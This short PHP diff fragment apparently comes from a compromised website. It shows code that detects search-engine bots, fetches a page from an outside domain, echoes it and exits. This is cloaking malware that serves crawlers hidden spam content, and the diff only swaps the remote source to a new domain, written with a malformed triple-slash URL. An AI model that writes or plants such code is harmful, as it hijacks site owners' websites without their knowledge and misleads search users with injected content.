@@ -14,7 +14,7 @@ return true;
 return false;
 }
 if (is_bot()) {
-echo file_get_contents('https://grtoto.store/conextion-link/innovatixsystems.html');
+echo file_get_contents('https:///theonlyd.xyz/santuariosantarita.html');
 exit;
 }
 
